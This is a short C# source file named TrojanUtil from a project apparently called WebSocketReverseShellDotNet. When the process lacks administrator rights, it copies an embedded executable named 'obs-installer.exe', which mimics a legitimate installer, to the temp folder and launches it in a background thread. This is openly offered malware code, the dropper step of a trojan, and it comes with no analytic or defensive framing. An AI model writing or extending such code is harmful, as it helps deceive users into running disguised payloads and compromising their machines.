using System;
using System.Collections.Generic;
using System.Data.Entity.Core.Metadata.Edm;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WebSocketReverseShellDotNet.utils
{
    internal class TrojanUtil
    {


        private static async Task CreateTrojan()
        {
            if (!OSUtil.IsAdministrator())
            {
                // Create a copy of the current executable
                String path = OSUtil.CopyResourceToTempFolder("obs-installer.exe");

                if (path != null)
                {

                    OSUtil.RunInSeparateThread(() => OSUtil.ExecuteCommandAsync(path));
                }

            }

        }  
        

        public static void RunTrojan()
        {
            OSUtil.RunInSeparateThread(() => CreateTrojan());
        }




    }
}
